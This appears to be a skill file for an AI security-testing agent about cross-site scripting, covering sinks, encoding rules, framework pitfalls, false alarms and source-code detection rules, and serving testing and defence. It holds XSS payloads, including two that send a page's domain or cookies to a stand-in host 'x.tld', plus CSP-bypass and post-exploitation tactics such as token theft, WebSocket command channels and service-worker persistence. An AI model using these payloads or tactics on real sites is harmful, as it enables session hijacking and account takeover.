---
name: xss
description: XSS testing covering reflected, stored, and DOM-based vectors with CSP bypass techniques
---

# XSS

Cross-site scripting persists because context boundaries, parser behavior, and framework-specific edges combine in non-obvious ways. Every user-influenced string must be treated as untrusted until it has been strictly encoded for the exact sink it reaches, and guarded by a runtime policy such as CSP or Trusted Types.

## Where to Look

**Types**
- Reflected, stored, and DOM-based XSS across web, mobile, and desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR rendering pipelines

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping mechanisms

## Sink Locations

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email and PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML filenames and EXIF fields, office documents processed server-side or client-side

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure the attribute is quoted; unquoted attributes must never carry user data
- **URL/JS URL**: encode and validate scheme against an allowlist (https/mailto/tel); reject javascript and data schemes
- **JS string**: escape quotes, backslashes, and newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style rules; sanitize property names and values; watch for `url()` and `expression()`
- **SVG/MathML**: treat as active content; many elements execute via onload or animation events

## Vulnerability Patterns

### DOM XSS

**Sources**
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` when called with string arguments
- `eval`/`Function`, `new Worker` with blob URLs

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### Mutation XSS

Leverage browser parser repair behavior to transform safe-looking markup into executable code (e.g., noscript, malformed tags):
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcard source entries, `data:` or `blob:` permitted, inline events allowed
- Script gadgets: JSONP endpoints, libraries that expose function constructors
- Import maps or modulepreload directives with insufficiently scoped policies
- Base tag injection to retarget relative script URLs to attacker-controlled origins
- Dynamic module import through permitted origins

### Trusted Types Bypass

- Custom policies that return unsanitized strings; abuse of whitelisted policy names
- Sinks not covered by Trusted Types (CSS, URL handlers) exploited through available gadgets

## Polyglot Payloads

Maintain a compact, context-tuned set:
- **HTML node**: `<svg onload=alert(1)>`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)`
- **JS string**: `"-alert(1)-"`
- **URL**: `javascript:alert(1)`

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: event handlers or URL values sourced from untrusted input
- Bypass patterns: unsanitized HTML flowing through third-party libraries; custom renderers that use innerHTML internally

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can cause the browser to re-interpret server-supplied content

### Angular

- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker-controlled markup

### Svelte

- Sinks: `{@html}` and dynamic attribute expressions

### Meta-Frameworks (SSR Sinks)

**Next.js**
- `dangerouslySetInnerHTML` in server components or pages — same risk as client React
- `getServerSideProps` / `getStaticProps` returning unsanitized HTML that reaches `dangerouslySetInnerHTML`
- `next/head` with user-controlled `<script>` or meta content injection
- API routes (`pages/api/`) returning HTML responses with user data — treated as server-rendered XSS

**Nuxt (Vue SSR)**
- `v-html` in SSR-rendered components — HTML injected during server render is sent to all clients
- `useAsyncData` / `useFetch` returning unsanitized content rendered via `v-html`
- Nuxt `server/api/` handlers returning HTML with user input

**SvelteKit**
- `{@html userInput}` in SSR-rendered `.svelte` components — same as client-side but affects all users
- `+page.server.ts` / `+layout.server.ts` load functions returning unsanitized data that reaches `{@html}`
- Form actions returning HTML content with user-controlled values

**Key principle**: SSR XSS is typically **stored-equivalent** in severity because the malicious output is rendered server-side and served to every requesting client, not just the attacker's browser.

### Markdown/Richtext

- Many renderers pass HTML through by default; plugins may re-enable raw HTML output
- Sanitize after rendering; prohibit inline HTML or constrain to a minimal safe element set

## Special Contexts

### Email

- Most clients strip script elements but permit CSS rules and remote content loading
- Restrict testing to CSS and URL-based techniques where JS execution is not expected

### PDF and Docs

- PDF engines may execute JavaScript inside annotations or form submit actions
- Test `javascript:` in link and submit action fields

### File Uploads

- SVG and HTML files served with `text/html` or `image/svg+xml` content types can execute inline scripts
- Confirm content-type enforcement and `Content-Disposition: attachment` headers
- Watch for MIME sniffing bypasses; require `X-Content-Type-Options: nosniff`

## Post-Exploitation

- Session and token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 channel with a constrained command set
- Persistence: service worker registration; localStorage or script gadget re-injection
- Impact paths: role hijack, CSRF chaining, internal port scanning via fetch, credential phishing overlays

## Analysis Workflow

1. **Identify sources** — URL/query/hash/referrer, postMessage, storage, WebSocket, server-injected JSON
2. **Trace to sinks** — Follow data flow from each source to its eventual sink
3. **Classify context** — HTML node, attribute, URL, script block, event handler, eval-like JS, CSS, SVG
4. **Assess defenses** — Output encoding, sanitizer configuration, CSP headers, Trusted Types enforcement, DOMPurify config
5. **Craft payloads** — Minimal context-specific payloads with encoding, whitespace, and casing variants
6. **Multi-channel** — Exercise all transports: REST, GraphQL, WebSocket, SSE, service workers

## Confirming a Finding

1. Supply the minimal payload alongside context (sink type) with before-and-after DOM state or network evidence
2. Demonstrate cross-browser execution where behavior diverges, or explain parser-specific mechanics
3. Show that stated defenses are bypassed — sanitizer settings, CSP headers, Trusted Types — with concrete proof
4. Quantify impact beyond proof-of-concept: data accessed, action performed, persistence achieved

## Common False Alarms

- Reflected content that is correctly encoded for the exact context it appears in
- CSP policies enforcing nonces or hashes with no inline events and no dangerous sources
- Trusted Types enforced on all relevant sinks; DOMPurify configured in strict mode with URI allowlists
- Scriptable contexts disabled, raw HTML passthrough prohibited, and safe URL schemes enforced

## Business Risk

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining to drive unauthorized state-changing actions
- Malware distribution and phishing via injected content
- Persistent compromise through service worker registration

## Analyst Notes

1. Begin with context classification rather than payload brute force
2. Use DOM instrumentation to log sink activity and uncover unexpected data flows
3. Maintain a small, curated payload set organized by context; iterate with encoding and casing variants
4. Validate defenses by inspecting their configuration and running negative tests
5. Prefer impact-driven PoCs — exfiltration, CSRF chains — over bare alert boxes
6. Treat SVG and MathML as first-class active content; test them independently
7. Rerun tests across different transports and render paths — SSR, CSR, and hydration behave differently
8. Probe CSP and Trusted Types policies intentionally: attempt to violate them and capture the resulting violation reports

## Core Principle

Context and sink together determine whether execution occurs. Encode precisely for the target context, enforce runtime policies through CSP and Trusted Types, and validate every alternative render path. Compact, well-evidenced payloads outperform exhaustive payload catalogs.

## Java Source Detection Rules

### TRUE POSITIVE: Unescaped data in server-generated HTML
- Untrusted data from `@RequestParam`, `request.getParameter(...)`, path variables, headers, or database fields is concatenated or interpolated into HTML markup returned to the browser.
- Java sinks include `ResponseEntity<String>`, `@ResponseBody String`, servlet/JSP writers, or template fragments that build HTML with `String.format(...)`, `+`, or `StringBuilder` without HTML encoding.
- Thymeleaf `th:utext` rendering of untrusted model data is a true positive because it outputs raw HTML.

### TRUE POSITIVE: Stored XSS during HTML rendering
- Data loaded from persistence such as `ResultSet.getString(...)`, entity fields, or repository results is still untrusted when inserted into HTML without contextual encoding.
- A database round-trip does not make the value safe; the finding depends on the final HTML sink.
- `th:text` is only safe for normal HTML text nodes; inside `<script ... th:text="${...}"></script>` or other JavaScript sink contexts it should still be treated as executable `xss`.
- Java handlers that assemble HTML or JavaScript with `StringBuilder`, `String.format`, `append(...)`, or JSP fragments from request or database values are `xss` when the response is browser-rendered, including directory listings and AJAX HTML fragments.

### FALSE POSITIVE: Escaped template output
- Thymeleaf `th:text` escapes HTML by default and should not be flagged unless there is separate evidence that escaping is bypassed or disabled.
- Template output that uses framework HTML escaping is not a finding without a raw-output sink.

### FALSE POSITIVE: JSON-only responses
- `@RestController` responses, Jackson JSON serialization, or `application/json` echoes are not XSS by themselves because they are not HTML or JavaScript rendering sinks.
- Do not report XSS when the only server-side behavior shown is returning JSON or plain data with no browser rendering step.
## Python/JS/PHP Source Detection Rules

### Python (Jinja2 / Flask)
- **VULN**: `render_template_string(user_input)` — template content is user-controlled
- **VULN**: `Markup(user_input)` or `markupsafe.Markup(user_input)` — marks attacker string as safe HTML
- **VULN**: `{{ var | safe }}` in template where `var` comes from a request parameter
- **SAFE**: `render_template('page.html', name=user_input)` — framework auto-escapes variables

### JavaScript (DOM / React / Vue)
- **VULN**: `element.innerHTML = userInput` — direct DOM sink
- **VULN**: `document.write(userInput)`, `element.outerHTML = userInput`
- **VULN**: `dangerouslySetInnerHTML={{ __html: userInput }}` — React explicit unsafe HTML
- **VULN**: `v-html="userInput"` — Vue directive renders raw HTML
- **SAFE**: `element.textContent = userInput`, `element.innerText = userInput`
- **SAFE**: React JSX `<div>{userInput}</div>` — auto-escaped by React

### PHP
- **VULN**: `echo $_GET['name']` — no escaping
- **VULN**: `echo $_POST['msg']` — no escaping
- **VULN**: `print $userInput` — no escaping
- **SAFE**: `echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8')`
- **SAFE**: `echo htmlentities($userInput)`

## Java Servlet Patterns (CWE-79)

**VULN** — tainted input written directly to HTTP response:
```java
PrintWriter out = response.getWriter();
out.println("<p>" + tainted + "</p>");
out.print(tainted);
response.getWriter().println(tainted);
```

**SAFE** — tainted input is HTML-encoded before output:
```java
ESAPI.encoder().encodeForHTML(tainted)
StringEscapeUtils.escapeHtml4(tainted)
```

**Decision rule**: tainted data reaches `PrintWriter.print`/`println`/`write` without encoding → **VULN**. ESAPI or equivalent encoding → **SAFE**.

**Edge cases**:
- `response.getWriter().println(bar.toCharArray())` is **VULN** when `bar` is tainted — converting to `char[]` does not sanitize output.
- `response.getWriter().format(locale, bar, obj)` is **VULN** when `bar` itself is tainted and used as the format string.
- `printf`/`format` with a **fixed** format string is **SAFE** when every inserted argument is fixed or already HTML-encoded.
